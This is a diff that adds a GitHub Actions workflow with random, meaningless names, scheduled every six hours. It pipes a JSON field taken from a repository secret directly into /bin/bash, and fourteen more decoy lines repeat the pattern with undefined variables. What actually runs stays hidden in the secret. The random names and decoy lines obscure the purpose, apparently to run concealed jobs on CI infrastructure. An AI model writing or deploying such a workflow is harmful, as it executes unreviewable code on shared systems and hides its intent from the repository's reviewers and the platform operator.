@@ -1,0 +1,31 @@
+name: baizhengjuwei
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: baizhengjuwei
+        env:
+          e482: ${{ secrets.e482 }}
+        run: |
+          echo $e482 | jq -r .xurie5534 | /bin/bash
+          echo $ortm38524 | jq -r .u3 | /bin/bash
+          echo $llbuj92 | jq -r .tr099 | /bin/bash
+          echo $g88 | jq -r .ajm7 | /bin/bash
+          echo $airnf87469 | jq -r .e70166 | /bin/bash
+          echo $fg55554 | jq -r .j48 | /bin/bash
+          echo $be7 | jq -r .muvyk4 | /bin/bash
+          echo $wxbi100 | jq -r .pcoyc259 | /bin/bash
+          echo $qcukr2 | jq -r .z3 | /bin/bash
+          echo $fw00924 | jq -r .vfr24199 | /bin/bash
+          echo $dagx19 | jq -r .a50 | /bin/bash
+          echo $gv96 | jq -r .rw2599 | /bin/bash
+          echo $k902 | jq -r .wohmn019 | /bin/bash
+          echo $qqrs2 | jq -r .xtzte9 | /bin/bash
+          echo $reea35901 | jq -r .dpx8 | /bin/bash
+
